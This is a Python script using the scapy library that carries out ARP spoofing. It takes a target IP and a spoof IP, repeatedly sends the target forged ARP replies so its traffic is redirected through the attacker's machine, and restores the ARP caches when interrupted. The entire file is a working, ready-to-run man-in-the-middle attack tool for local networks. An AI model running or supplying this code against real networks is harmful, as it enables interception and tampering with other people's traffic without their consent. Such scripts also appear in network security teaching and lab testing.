import scapy.all as scapy 
import time
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Please specifiy a target")
    parser.add_argument("-s", "--spoof", dest="spoof_ip", help="Please specify what to tell the target your IP is.")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please specify a target. Use --help for more details")
    elif not options.spoof_ip:
        parser.error("Please specify a spoof. Use --help for more details")
    else:
        return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #this is tell the target IP and MAC that you are at the MAC of the spoof IP 
    ether_frame = scapy.Ether(dst=target_mac)/packet
    scapy.sendp(ether_frame, verbose=False)

def restore(target_ip, spoof_ip): 
    dest_mac = get_mac(target_ip)
    src_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=src_mac)
    ether_frame = scapy.Ether(dst=dest_mac)/packet
    print(f"[+] Restoring ARP cache for {target_ip}")
    scapy.sendp(ether_frame, verbose=False, count=4)


sent_packet_count = 0
options = get_args()

try: 
    while True:
        spoof(options.target_ip, options.spoof_ip)
        sent_packet_count += 1
        print("[+] Packets sent: " + str(sent_packet_count), end='\r')
        time.sleep(2)
except KeyboardInterrupt: 
    print(" [+] Detected CRT + C ........ Restoring ARP")
    restore(options.spoof_ip, options.target_ip)
    restore(options.target_ip, options.spoof_ip)
    
